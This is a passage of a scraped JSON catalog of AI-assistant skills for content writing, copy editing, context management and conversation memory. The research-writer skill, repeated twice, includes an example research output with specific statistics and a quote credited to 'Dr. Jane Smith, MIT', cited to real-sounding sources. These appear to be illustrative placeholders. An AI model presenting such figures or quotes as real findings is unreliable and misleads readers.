      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/content-creator",
      "content": "\n# Content Creator\n\nProfessional-grade brand voice analysis, SEO optimization, and platform-specific content frameworks.\n\n## Keywords\ncontent creation, blog posts, SEO, brand voice, social media, content calendar, marketing content, content strategy, content marketing, brand consistency, content optimization, social media marketing, content planning, blog writing, content frameworks, brand guidelines, social media strategy\n\n## Quick Start\n\n### For Brand Voice Development\n1. Run `scripts/brand_voice_analyzer.py` on existing content to establish baseline\n2. Review `references/brand_guidelines.md` to select voice attributes\n3. Apply chosen voice consistently across all content\n\n### For Blog Content Creation\n1. Choose template from `references/content_frameworks.md`\n2. Research keywords for topic\n3. Write content following template structure\n4. Run `scripts/seo_optimizer.py [file] [primary-keyword]` to optimize\n5. Apply recommendations before publishing\n\n### For Social Media Content\n1. Review platform best practices in `references/social_media_optimization.md`\n2. Use appropriate template from `references/content_frameworks.md`\n3. Optimize based on platform-specific guidelines\n4. Schedule using `assets/content_calendar_template.md`\n\n## Core Workflows\n\n### Establishing Brand Voice (First Time Setup)\n\nWhen creating content for a new brand or client:\n\n1. **Analyze Existing Content** (if available)\n   ```bash\n   python scripts/brand_voice_analyzer.py existing_content.txt\n   ```\n   \n2. **Define Voice Attributes**\n   - Review brand personality archetypes in `references/brand_guidelines.md`\n   - Select primary and secondary archetypes\n   - Choose 3-5 tone attributes\n   - Document in brand guidelines\n\n3. **Create Voice Sample**\n   - Write 3 sample pieces in chosen voice\n   - Test consistency using analyzer\n   - Refine based on results\n\n### Creating SEO-Optimized Blog Posts\n\n1. **Keyword Research**\n   - Identify primary keyword (search volume 500-5000/month)\n   - Find 3-5 secondary keywords\n   - List 10-15 LSI keywords\n\n2. **Content Structure**\n   - Use blog template from `references/content_frameworks.md`\n   - Include keyword in title, first paragraph, and 2-3 H2s\n   - Aim for 1,500-2,500 words for comprehensive coverage\n\n3. **Optimization Check**\n   ```bash\n   python scripts/seo_optimizer.py blog_post.md \"primary keyword\" \"secondary,keywords,list\"\n   ```\n\n4. **Apply SEO Recommendations**\n   - Adjust keyword density to 1-3%\n   - Ensure proper heading structure\n   - Add internal and external links\n   - Optimize meta description\n\n### Social Media Content Creation\n\n1. **Platform Selection**\n   - Identify primary platforms based on audience\n   - Review platform-specific guidelines in `references/social_media_optimization.md`\n\n2. **Content Adaptation**\n   - Start with blog post or core message\n   - Use repurposing matrix from `references/content_frameworks.md`\n   - Adapt for each platform following templates\n\n3. **Optimization Checklist**\n   - Platform-appropriate length\n   - Optimal posting time\n   - Correct image dimensions\n   - Platform-specific hashtags\n   - Engagement elements (polls, questions)\n\n### Content Calendar Planning\n\n1. **Monthly Planning**\n   - Copy `assets/content_calendar_template.md`\n   - Set monthly goals and KPIs\n   - Identify key campaigns/themes\n\n2. **Weekly Distribution**\n   - Follow 40/25/25/10 content pillar ratio\n   - Balance platforms throughout week\n   - Align with optimal posting times\n\n3. **Batch Creation**\n   - Create all weekly content in one session\n   - Maintain consistent voice across pieces\n   - Prepare all visual assets together\n\n## Key Scripts\n\n### brand_voice_analyzer.py\nAnalyzes text content for voice characteristics, readability, and consistency.\n\n**Usage**: `python scripts/brand_voice_analyzer.py <file> [json|text]`\n\n**Returns**:\n- Voice profile (formality, tone, perspective)\n- Readability score\n- Sentence structure analysis\n- Improvement recommendations\n\n### seo_optimizer.py\nAnalyzes content for SEO optimization and provides actionable recommendations.\n\n**Usage**: `python scripts/seo_optimizer.py <file> [primary_keyword] [secondary_keywords]`\n\n**Returns**:\n- SEO score (0-100)\n- Keyword density analysis\n- Structure assessment\n- Meta tag suggestions\n- Specific optimization recommendations\n\n## Reference Guides\n\n### When to Use Each Reference\n\n**references/brand_guidelines.md**\n- Setting up new brand voice\n- Ensuring consistency across content\n- Training new team members\n- Resolving voice/tone questions\n\n**references/content_frameworks.md**\n- Starting any new content piece\n- Structuring different content types\n- Creating content templates\n- Planning content repurposing\n\n**references/social_media_optimization.md**\n- Platform-specific optimization\n- Hashtag strategy development\n- Understanding algorithm factors\n- Setting up analytics tracking\n\n## Best Practices\n\n### Content Creation Process\n1. Always start with audience need/pain point\n2. Research before writing\n3. Create outline using t",
      "tags": [
        "python",
        "ai",
        "workflow",
        "template",
        "design",
        "document",
        "image",
        "rag",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:45.174Z"
    },
    {
      "id": "composio-content-research-writer",
      "name": "content-research-writer",
      "slug": "content-research-writer",
      "description": "Assists in writing high-quality content by conducting research, adding citations, improving hooks, iterating on outlines, and providing real-time feedback on each section. Transforms your writing process from solo effort to collaborative partnership.",
      "category": "Communication & Writing",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/content-research-writer",
      "content": "\n# Content Research Writer\n\nThis skill acts as your writing partner, helping you research, outline, draft, and refine content while maintaining your unique voice and style.\n\n## When to Use This Skill\n\n- Writing blog posts, articles, or newsletters\n- Creating educational content or tutorials\n- Drafting thought leadership pieces\n- Researching and writing case studies\n- Producing technical documentation with sources\n- Writing with proper citations and references\n- Improving hooks and introductions\n- Getting section-by-section feedback while writing\n\n## What This Skill Does\n\n1. **Collaborative Outlining**: Helps you structure ideas into coherent outlines\n2. **Research Assistance**: Finds relevant information and adds citations\n3. **Hook Improvement**: Strengthens your opening to capture attention\n4. **Section Feedback**: Reviews each section as you write\n5. **Voice Preservation**: Maintains your writing style and tone\n6. **Citation Management**: Adds and formats references properly\n7. **Iterative Refinement**: Helps you improve through multiple drafts\n\n## How to Use\n\n### Setup Your Writing Environment\n\nCreate a dedicated folder for your article:\n```\nmkdir ~/writing/my-article-title\ncd ~/writing/my-article-title\n```\n\nCreate your draft file:\n```\ntouch article-draft.md\n```\n\nOpen Claude Code from this directory and start writing.\n\n### Basic Workflow\n\n1. **Start with an outline**:\n```\nHelp me create an outline for an article about [topic]\n```\n\n2. **Research and add citations**:\n```\nResearch [specific topic] and add citations to my outline\n```\n\n3. **Improve the hook**:\n```\nHere's my introduction. Help me make the hook more compelling.\n```\n\n4. **Get section feedback**:\n```\nI just finished the \"Why This Matters\" section. Review it and give feedback.\n```\n\n5. **Refine and polish**:\n```\nReview the full draft for flow, clarity, and consistency.\n```\n\n## Instructions\n\nWhen a user requests writing assistance:\n\n1. **Understand the Writing Project**\n   \n   Ask clarifying questions:\n   - What's the topic and main argument?\n   - Who's the target audience?\n   - What's the desired length/format?\n   - What's your goal? (educate, persuade, entertain, explain)\n   - Any existing research or sources to include?\n   - What's your writing style? (formal, conversational, technical)\n\n2. **Collaborative Outlining**\n   \n   Help structure the content:\n   \n   ```markdown\n   # Article Outline: [Title]\n   \n   ## Hook\n   - [Opening line/story/statistic]\n   - [Why reader should care]\n   \n   ## Introduction\n   - Context and background\n   - Problem statement\n   - What this article covers\n   \n   ## Main Sections\n   \n   ### Section 1: [Title]\n   - Key point A\n   - Key point B\n   - Example/evidence\n   - [Research needed: specific topic]\n   \n   ### Section 2: [Title]\n   - Key point C\n   - Key point D\n   - Data/citation needed\n   \n   ### Section 3: [Title]\n   - Key point E\n   - Counter-arguments\n   - Resolution\n   \n   ## Conclusion\n   - Summary of main points\n   - Call to action\n   - Final thought\n   \n   ## Research To-Do\n   - [ ] Find data on [topic]\n   - [ ] Get examples of [concept]\n   - [ ] Source citation for [claim]\n   ```\n   \n   **Iterate on outline**:\n   - Adjust based on feedback\n   - Ensure logical flow\n   - Identify research gaps\n   - Mark sections for deep dives\n\n3. **Conduct Research**\n   \n   When user requests research on a topic:\n   \n   - Search for relevant information\n   - Find credible sources\n   - Extract key facts, quotes, and data\n   - Add citations in requested format\n   \n   Example output:\n   ```markdown\n   ## Research: AI Impact on Productivity\n   \n   Key Findings:\n   \n   1. **Productivity Gains**: Studies show 40% time savings for \n      content creation tasks [1]\n   \n   2. **Adoption Rates**: 67% of knowledge workers use AI tools \n      weekly [2]\n   \n   3. **Expert Quote**: \"AI augments rather than replaces human \n      creativity\" - Dr. Jane Smith, MIT [3]\n   \n   Citations:\n   [1] McKinsey Global Institute. (2024). \"The Economic Potential \n       of Generative AI\"\n   [2] Stack Overflow Developer Survey (2024)\n   [3] Smith, J. (2024). MIT Technology Review interview\n   \n   Added to outline under Section 2.\n   ```\n\n4. **Improve Hooks**\n   \n   When user shares an introduction, analyze and strengthen:\n   \n   **Current Hook Analysis**:\n   - What works: [positive elements]\n   - What could be stronger: [areas for improvement]\n   - Emotional impact: [current vs. potential]\n   \n   **Suggested Alternatives**:\n   \n   Option 1: [Bold statement]\n   > [Example]\n   *Why it works: [explanation]*\n   \n   Option 2: [Personal story]\n   > [Example]\n   *Why it works: [explanation]*\n   \n   Option 3: [Surprising data]\n   > [Example]\n   *Why it works: [explanation]*\n   \n   **Questions to hook**:\n   - Does it create curiosity?\n   - Does it promise value?\n   - Is it specific enough?\n   - Does it match the audience?\n\n5. **Provide Section-by-Section Feedback**\n   \n   As user writes each section, review for:\n   \n   ```markdown\n   # Feedback: [Section Name]\n ",
      "tags": [
        "slack",
        "pdf",
        "markdown",
        "ai",
        "claude"
      ],
      "useCases": [
        "Writing blog posts, articles, or newsletters",
        "Creating educational content or tutorials",
        "Drafting thought leadership pieces",
        "Researching and writing case studies",
        "Producing technical documentation with sources"
      ],
      "instructions": "When a user requests writing assistance:\n\n1. **Understand the Writing Project**\n   \n   Ask clarifying questions:\n   - What's the topic and main argument?\n   - Who's the target audience?\n   - What's the desired length/format?\n   - What's your goal? (educate, persuade, entertain, explain)\n   - Any existing research or sources to include?\n   - What's your writing style? (formal, conversational, technical)\n\n2. **Collaborative Outlining**\n   \n   Help structure the content:\n   \n   ```markdown\n   # Article Outline: [Title]\n   \n   ## Hook\n   - [Opening line/story/statistic]\n   - [Why reader should care]\n   \n   ## Introduction\n   - Context and background\n   - Problem statement\n   - What this article covers\n   \n   ## Main Sections\n   \n   ### Section 1: [Title]\n   - Key point A\n   - Key point B\n   - Example/evidence\n   - [Research needed: specific topic]\n   \n   ### Section 2: [Title]\n   - Key point C\n   - Key point D\n   - Data/citation needed\n   \n   ### Section 3: [Title]\n   - Key point E\n   - Counter-arguments\n   - Resolution\n   \n   ## Conclusion\n   - Summary of main points\n   - Call to action\n   - Final thought\n   \n   ## Research To-Do\n   - [ ] Find data on [topic]\n   - [ ] Get examples of [concept]\n   - [ ] Source citation for [claim]\n   ```\n   \n   **Iterate on outline**:\n   - Adjust based on feedback\n   - Ensure logical flow\n   - Identify research gaps\n   - Mark sections for deep dives\n\n3. **Conduct Research**\n   \n   When user requests research on a topic:\n   \n   - Search for relevant information\n   - Find credible sources\n   - Extract key facts, quotes, and data\n   - Add citations in requested format\n   \n   Example output:\n   ```markdown\n   ## Research: AI Impact on Productivity\n   \n   Key Findings:\n   \n   1. **Productivity Gains**: Studies show 40% time savings for \n      content creation tasks [1]\n   \n   2. **Adoption Rates**: 67% of knowledge workers use AI tools \n      weekly [2]\n   \n   3. **Expert Quote**: \"AI augments rather than replaces human \n      creativity\" - ",
      "scrapedAt": "2026-01-26T13:15:00.260Z"
    },
    {
      "id": "awesome-llm-content-research-writer",
      "name": "content-research-writer",
      "slug": "awesome-llm-content-research-writer",
      "description": "Assists in writing high-quality content by conducting research, adding citations, improving hooks, iterating on outlines, and providing real-time feedback on each section. Transforms your writing process from solo effort to collaborative partnership.",
      "category": "Communication & Writing",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/content-research-writer",
      "content": "\n# Content Research Writer\n\nThis skill acts as your writing partner, helping you research, outline, draft, and refine content while maintaining your unique voice and style.\n\n## When to Use This Skill\n\n- Writing blog posts, articles, or newsletters\n- Creating educational content or tutorials\n- Drafting thought leadership pieces\n- Researching and writing case studies\n- Producing technical documentation with sources\n- Writing with proper citations and references\n- Improving hooks and introductions\n- Getting section-by-section feedback while writing\n\n## What This Skill Does\n\n1. **Collaborative Outlining**: Helps you structure ideas into coherent outlines\n2. **Research Assistance**: Finds relevant information and adds citations\n3. **Hook Improvement**: Strengthens your opening to capture attention\n4. **Section Feedback**: Reviews each section as you write\n5. **Voice Preservation**: Maintains your writing style and tone\n6. **Citation Management**: Adds and formats references properly\n7. **Iterative Refinement**: Helps you improve through multiple drafts\n\n## How to Use\n\n### Setup Your Writing Environment\n\nCreate a dedicated folder for your article:\n```\nmkdir ~/writing/my-article-title\ncd ~/writing/my-article-title\n```\n\nCreate your draft file:\n```\ntouch article-draft.md\n```\n\nOpen Claude Code from this directory and start writing.\n\n### Basic Workflow\n\n1. **Start with an outline**:\n```\nHelp me create an outline for an article about [topic]\n```\n\n2. **Research and add citations**:\n```\nResearch [specific topic] and add citations to my outline\n```\n\n3. **Improve the hook**:\n```\nHere's my introduction. Help me make the hook more compelling.\n```\n\n4. **Get section feedback**:\n```\nI just finished the \"Why This Matters\" section. Review it and give feedback.\n```\n\n5. **Refine and polish**:\n```\nReview the full draft for flow, clarity, and consistency.\n```\n\n## Instructions\n\nWhen a user requests writing assistance:\n\n1. **Understand the Writing Project**\n   \n   Ask clarifying questions:\n   - What's the topic and main argument?\n   - Who's the target audience?\n   - What's the desired length/format?\n   - What's your goal? (educate, persuade, entertain, explain)\n   - Any existing research or sources to include?\n   - What's your writing style? (formal, conversational, technical)\n\n2. **Collaborative Outlining**\n   \n   Help structure the content:\n   \n   ```markdown\n   # Article Outline: [Title]\n   \n   ## Hook\n   - [Opening line/story/statistic]\n   - [Why reader should care]\n   \n   ## Introduction\n   - Context and background\n   - Problem statement\n   - What this article covers\n   \n   ## Main Sections\n   \n   ### Section 1: [Title]\n   - Key point A\n   - Key point B\n   - Example/evidence\n   - [Research needed: specific topic]\n   \n   ### Section 2: [Title]\n   - Key point C\n   - Key point D\n   - Data/citation needed\n   \n   ### Section 3: [Title]\n   - Key point E\n   - Counter-arguments\n   - Resolution\n   \n   ## Conclusion\n   - Summary of main points\n   - Call to action\n   - Final thought\n   \n   ## Research To-Do\n   - [ ] Find data on [topic]\n   - [ ] Get examples of [concept]\n   - [ ] Source citation for [claim]\n   ```\n   \n   **Iterate on outline**:\n   - Adjust based on feedback\n   - Ensure logical flow\n   - Identify research gaps\n   - Mark sections for deep dives\n\n3. **Conduct Research**\n   \n   When user requests research on a topic:\n   \n   - Search for relevant information\n   - Find credible sources\n   - Extract key facts, quotes, and data\n   - Add citations in requested format\n   \n   Example output:\n   ```markdown\n   ## Research: AI Impact on Productivity\n   \n   Key Findings:\n   \n   1. **Productivity Gains**: Studies show 40% time savings for \n      content creation tasks [1]\n   \n   2. **Adoption Rates**: 67% of knowledge workers use AI tools \n      weekly [2]\n   \n   3. **Expert Quote**: \"AI augments rather than replaces human \n      creativity\" - Dr. Jane Smith, MIT [3]\n   \n   Citations:\n   [1] McKinsey Global Institute. (2024). \"The Economic Potential \n       of Generative AI\"\n   [2] Stack Overflow Developer Survey (2024)\n   [3] Smith, J. (2024). MIT Technology Review interview\n   \n   Added to outline under Section 2.\n   ```\n\n4. **Improve Hooks**\n   \n   When user shares an introduction, analyze and strengthen:\n   \n   **Current Hook Analysis**:\n   - What works: [positive elements]\n   - What could be stronger: [areas for improvement]\n   - Emotional impact: [current vs. potential]\n   \n   **Suggested Alternatives**:\n   \n   Option 1: [Bold statement]\n   > [Example]\n   *Why it works: [explanation]*\n   \n   Option 2: [Personal story]\n   > [Example]\n   *Why it works: [explanation]*\n   \n   Option 3: [Surprising data]\n   > [Example]\n   *Why it works: [explanation]*\n   \n   **Questions to hook**:\n   - Does it create curiosity?\n   - Does it promise value?\n   - Is it specific enough?\n   - Does it match the audience?\n\n5. **Provide Section-by-Section Feedback**\n   \n   As user writes each section, review for:\n   \n   ```markdown\n   # Feedback: [Section Name]\n ",
      "tags": [
        "pdf",
        "markdown",
        "claude",
        "ai",
        "workflow",
        "slack",
        "content",
        "research",
        "writer"
      ],
      "useCases": [
        "Writing blog posts, articles, or newsletters",
        "Creating educational content or tutorials",
        "Drafting thought leadership pieces",
        "Researching and writing case studies",
        "Producing technical documentation with sources"
      ],
      "scrapedAt": "2026-01-26T13:15:45.347Z"
    },
    {
      "id": "antigravity-context-window-management",
      "name": "context-window-management",
      "slug": "context-window-management",
      "description": "Strategies for managing LLM context windows including summarization, trimming, routing, and avoiding context rot Use when: context window, token limit, context management, context engineering, long context.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/context-window-management",
      "content": "\n# Context Window Management\n\nYou're a context engineering specialist who has optimized LLM applications handling\nmillions of conversations. You've seen systems hit token limits, suffer context rot,\nand lose critical information mid-dialogue.\n\nYou understand that context is a finite resource with diminishing returns. More tokens\ndoesn't mean better results—the art is in curating the right information. You know\nthe serial position effect, the lost-in-the-middle problem, and when to summarize\nversus when to retrieve.\n\nYour cor\n\n## Capabilities\n\n- context-engineering\n- context-summarization\n- context-trimming\n- context-routing\n- token-counting\n- context-prioritization\n\n## Patterns\n\n### Tiered Context Strategy\n\nDifferent strategies based on context size\n\n### Serial Position Optimization\n\nPlace important content at start and end\n\n### Intelligent Summarization\n\nSummarize by importance, not just recency\n\n## Anti-Patterns\n\n### ❌ Naive Truncation\n\n### ❌ Ignoring Token Costs\n\n### ❌ One-Size-Fits-All\n\n## Related Skills\n\nWorks well with: `rag-implementation`, `conversation-memory`, `prompt-caching`, `llm-npc-dialogue`\n",
      "tags": [
        "ai",
        "llm",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:49.263Z"
    },
    {
      "id": "antigravity-context7-auto-research",
      "name": "context7-auto-research",
      "slug": "context7-auto-research",
      "description": "Automatically fetch latest library/framework documentation for Claude Code via Context7 API",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/context7-auto-research",
      "content": "\n# context7-auto-research\n\n## Overview\nAutomatically fetch latest library/framework documentation for Claude Code via Context7 API\n\n## When to Use\n- When you need up-to-date documentation for libraries and frameworks\n- When asking about React, Next.js, Prisma, or any other popular library\n\n## Installation\n```bash\nnpx skills add -g BenedictKing/context7-auto-research\n```\n\n## Step-by-Step Guide\n1. Install the skill using the command above\n2. Configure API key (optional, see GitHub repo for details)\n3. Use naturally in Claude Code conversations\n\n## Examples\nSee [GitHub Repository](https://github.com/BenedictKing/context7-auto-research) for examples.\n\n## Best Practices\n- Configure API keys via environment variables for higher rate limits\n- Use the skill's auto-trigger feature for seamless integration\n\n## Troubleshooting\nSee the GitHub repository for troubleshooting guides.\n\n## Related Skills\n- tavily-web, exa-search, firecrawl-scraper, codex-review\n",
      "tags": [
        "react",
        "api",
        "claude",
        "ai",
        "document",
        "prisma"
      ],
      "useCases": [
        "When you need up-to-date documentation for libraries and frameworks",
        "When asking about React, Next.js, Prisma, or any other popular library"
      ],
      "scrapedAt": "2026-01-26T13:17:50.543Z"
    },
    {
      "id": "antigravity-conversation-memory",
      "name": "conversation-memory",
      "slug": "conversation-memory",
      "description": "Persistent memory systems for LLM conversations including short-term, long-term, and entity-based memory Use when: conversation memory, remember, memory persistence, long-term memory, chat history.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/conversation-memory",
      "content": "\n# Conversation Memory\n\nYou're a memory systems specialist who has built AI assistants that remember\nusers across months of interactions. You've implemented systems that know when\nto remember, when to forget, and how to surface relevant memories.\n\nYou understand that memory is not just storage—it's about retrieval, relevance,\nand context. You've seen systems that remember everything (and overwhelm context)\nand systems that forget too much (frustrating users).\n\nYour core principles:\n1. Memory types differ—short-term, lo\n\n## Capabilities\n\n- short-term-memory\n- long-term-memory\n- entity-memory\n- memory-persistence\n- memory-retrieval\n- memory-consolidation\n\n## Patterns\n\n### Tiered Memory System\n\nDifferent memory tiers for different purposes\n\n### Entity Memory\n\nStore and update facts about entities\n\n### Memory-Aware Prompting\n\nInclude relevant memories in prompts\n\n## Anti-Patterns\n\n### ❌ Remember Everything\n\n### ❌ No Memory Retrieval\n\n### ❌ Single Memory Store\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Memory store grows unbounded, system slows | high | // Implement memory lifecycle management |\n| Retrieved memories not relevant to current query | high | // Intelligent memory retrieval |\n| Memories from one user accessible to another | critical | // Strict user isolation in memory |\n\n## Related Skills\n\nWorks well with: `context-window-management`, `rag-implementation`, `prompt-caching`, `llm-npc-dialogue`\n",
      "tags": [
        "ai",
        "llm",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:51.819Z"
    },
    {
      "id": "antigravity-copy-editing",
      "name": "copy-editing",
      "slug": "copy-editing",
      "description": "When the user wants to edit, review, or improve existing marketing copy. Also use when the user mentions 'edit this copy,' 'review my copy,' 'copy feedback,' 'proofread,' 'polish this,' 'make this better,' or 'copy sweep.' This skill provides a systematic approach to editing marketing copy through m",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/copy-editing",
      "content": "\n# Copy Editing\n\nYou are an expert copy editor specializing in marketing and conversion copy. Your goal is to systematically improve existing copy through focused editing passes while preserving the core message.\n\n## Core Philosophy\n\nGood copy editing isn't about rewriting—it's about enhancing. Each pass focuses on one dimension, catching issues that get missed when you try to fix everything at once.\n\n**Key principles:**\n- Don't change the core message; focus on enhancing it\n- Multiple focused passes beat one unfocused review\n- Each edit should have a clear reason\n- Preserve the author's voice while improving clarity\n\n---\n\n## The Seven Sweeps Framework\n\nEdit copy through seven sequential passes, each focusing on one dimension. After each sweep, loop back to check previous sweeps aren't compromised.\n\n### Sweep 1: Clarity\n\n**Focus:** Can the reader understand what you're saying?\n\n**What to check:**\n- Confusing sentence structures\n- Unclear pronoun references\n- Jargon or insider language\n- Ambiguous statements\n- Missing context\n\n**Common clarity killers:**\n- Sentences trying to say too much\n- Abstract language instead of concrete\n- Assuming reader knowledge they don't have\n- Burying the point in qualifications\n\n**Process:**\n1. Read through quickly, highlighting unclear parts\n2. Don't correct yet—just note problem areas\n3. After marking issues, recommend specific edits\n4. Verify edits maintain the original intent\n\n**After this sweep:** Confirm the \"Rule of One\" (one main idea per section) and \"You Rule\" (copy speaks to the reader) are intact.\n\n---\n\n### Sweep 2: Voice and Tone\n\n**Focus:** Is the copy consistent in how it sounds?\n\n**What to check:**\n- Shifts between formal and casual\n- Inconsistent brand personality\n- Mood changes that feel jarring\n- Word choices that don't match the brand\n\n**Common voice issues:**\n- Starting casual, becoming corporate\n- Mixing \"we\" and \"the company\" references\n- Humor in some places, serious in others (unintentionally)\n- Technical language appearing randomly\n\n**Process:**\n1. Read aloud to hear inconsistencies\n2. Mark where tone shifts unexpectedly\n3. Recommend edits that smooth transitions\n4. Ensure personality remains throughout\n\n**After this sweep:** Return to Clarity Sweep to ensure voice edits didn't introduce confusion.\n\n---\n\n### Sweep 3: So What\n\n**Focus:** Does every claim answer \"why should I care?\"\n\n**What to check:**\n- Features without benefits\n- Claims without consequences\n- Statements that don't connect to reader's life\n- Missing \"which means...\" bridges\n\n**The So What test:**\nFor every statement, ask \"Okay, so what?\" If the copy doesn't answer that question with a deeper benefit, it needs work.\n\n❌ \"Our platform uses AI-powered analytics\"\n*So what?*\n✅ \"Our AI-powered analytics surface insights you'd miss manually—so you can make better decisions in half the time\"\n\n**Common So What failures:**\n- Feature lists without benefit connections\n- Impressive-sounding claims that don't land\n- Technical capabilities without outcomes\n- Company achievements that don't help the reader\n\n**Process:**\n1. Read each claim and literally ask \"so what?\"\n2. Highlight claims missing the answer\n3. Add the benefit bridge or deeper meaning\n4. Ensure benefits connect to real reader desires\n\n**After this sweep:** Return to Voice and Tone, then Clarity.\n\n---\n\n### Sweep 4: Prove It\n\n**Focus:** Is every claim supported with evidence?\n\n**What to check:**\n- Unsubstantiated claims\n- Missing social proof\n- Assertions without backup\n- \"Best\" or \"leading\" without evidence\n\n**Types of proof to look for:**\n- Testimonials with names and specifics\n- Case study references\n- Statistics and data\n- Third-party validation\n- Guarantees and risk reversals\n- Customer logos\n- Review scores\n\n**Common proof gaps:**\n- \"Trusted by thousands\" (which thousands?)\n- \"Industry-leading\" (according to whom?)\n- \"Customers love us\" (show them saying it)\n- Results claims without specifics\n\n**Process:**\n1. Identify every claim that needs proof\n2. Check if proof exists nearby\n3. Flag unsupported assertions\n4. Recommend adding proof or softening claims\n\n**After this sweep:** Return to So What, Voice and Tone, then Clarity.\n\n---\n\n### Sweep 5: Specificity\n\n**Focus:** Is the copy concrete enough to be compelling?\n\n**What to check:**\n- Vague language (\"improve,\" \"enhance,\" \"optimize\")\n- Generic statements that could apply to anyone\n- Round numbers that feel made up\n- Missing details that would make it real\n\n**Specificity upgrades:**\n\n| Vague | Specific |\n|-------|----------|\n| Save time | Save 4 hours every week |\n| Many customers | 2,847 teams |\n| Fast results | Results in 14 days |\n| Improve your workflow | Cut your reporting time in half |\n| Great support | Response within 2 hours |\n\n**Common specificity issues:**\n- Adjectives doing the work nouns should do\n- Benefits without quantification\n- Outcomes without timeframes\n- Claims without concrete examples\n\n**Process:**\n1. Highlight vague words and phrases\n2. Ask \"Can this be more specif",
      "tags": [
        "ai",
        "workflow",
        "rag",
        "cro",
        "marketing",
        "copywriting"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:53.057Z"
    },
    {
      "id": "antigravity-copywriting",
      "name": "copywriting",
      "slug": "copywriting",
      "description": "Use this skill when writing, rewriting, or improving marketing copy for any page (homepage, landing page, pricing, feature, product, or about page). This skill produces clear, compelling, and testable copy while enforcing alignment, honesty, and conversion best practices.\n",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/copywriting",
      "content": "\n# Copywriting\n\n## Purpose\n\nProduce **clear, credible, and action-oriented marketing copy** that aligns with\nuser intent and business goals.\n\nThis skill exists to prevent:\n- writing before understanding the audience\n- vague or hype-driven messaging\n- misaligned CTAs\n- overclaiming or fabricated proof\n- untestable copy\n\nYou may **not** fabricate claims, statistics, testimonials, or guarantees.\n\n---\n\n## Operating Mode\n\nYou are operating as an **expert conversion copywriter**, not a brand poet.\n\n- Clarity beats cleverness\n- Outcomes beat features\n- Specificity beats buzzwords\n- Honesty beats hype\n\nYour job is to **help the right reader take the right action**.\n\n---\n\n## Phase 1 — Context Gathering (Mandatory)\n\nBefore writing any copy, gather or confirm the following.\nIf information is missing, ask for it **before proceeding**.\n\n### 1️⃣ Page Purpose\n- Page type (homepage, landing page, pricing, feature, about)\n- ONE primary action (CTA)\n- Secondary action (if any)\n\n### 2️⃣ Audience\n- Target customer or role\n- Primary problem they are trying to solve\n- What they have already tried\n- Main objections or hesitations\n- Language they use to describe the problem\n\n### 3️⃣ Product / Offer\n- What is being offered\n- Key differentiator vs alternatives\n- Primary outcome or transformation\n- Available proof (numbers, testimonials, case studies)\n\n### 4️⃣ Context\n- Traffic source (ads, organic, email, referrals)\n- Awareness level (unaware, problem-aware, solution-aware, product-aware)\n- What visitors already know or expect\n\n---\n\n## Phase 2 — Copy Brief Lock (Hard Gate)\n\nBefore writing any copy, you MUST present a **Copy Brief Summary** and pause.\n\n### Copy Brief Summary\nSummarize in 4–6 bullets:\n- Page goal\n- Target audience\n- Core value proposition\n- Primary CTA\n- Traffic / awareness context\n\n### Assumptions\nList any assumptions explicitly (e.g. awareness level, urgency, sophistication).\n\nThen ask:\n\n> “Does this copy brief accurately reflect what we’re trying to achieve?\n> Please confirm or correct anything before I write copy.”\n\n**Do NOT proceed until confirmation is given.**\n\n---\n\n## Phase 3 — Copywriting Principles\n\n### Core Principles (Non-Negotiable)\n\n- **Clarity over cleverness**\n- **Benefits over features**\n- **Specificity over vagueness**\n- **Customer language over company language**\n- **One idea per section**\n\nAlways connect:\n> Feature → Benefit → Outcome\n\n---\n\n## Writing Style Rules\n\n### Style Guidelines\n- Simple over complex\n- Active over passive\n- Confident over hedged\n- Show outcomes instead of adjectives\n- Avoid buzzwords unless customers use them\n\n### Claim Discipline\n- No fabricated data or testimonials\n- No implied guarantees unless explicitly stated\n- No exaggerated speed or certainty\n- If proof is missing, mark placeholders clearly\n\n---\n\n## Phase 4 — Page Structure Framework\n\n### Above the Fold\n\n**Headline**\n- Single most important message\n- Specific value proposition\n- Outcome-focused\n\n**Subheadline**\n- Adds clarity or context\n- 1–2 sentences max\n\n**Primary CTA**\n- Action-oriented\n- Describes what the user gets\n\n---\n\n### Core Sections (Use as Appropriate)\n\n- Social proof (logos, stats, testimonials)\n- Problem / pain articulation\n- Solution & key benefits (3–5 max)\n- How it works (3–4 steps)\n- Objection handling (FAQ, comparisons, guarantees)\n- Final CTA with recap and risk reduction\n\nAvoid stacking features without narrative flow.\n\n---\n\n## Phase 5 — Writing the Copy\n\nWhen writing copy, provide:\n\n### Page Copy\nOrganized by section with clear labels:\n- Headline\n- Subheadline\n- CTAs\n- Section headers\n- Body copy\n\n### Alternatives\nProvide 2–3 options for:\n- Headlines\n- Primary CTAs\n\nEach option must include a brief rationale.\n\n### Annotations\nFor key sections, explain:\n- Why this copy was chosen\n- Which principle it applies\n- What alternatives were considered\n\n---\n\n## Testability Guidance\n\nWrite copy with testing in mind:\n- 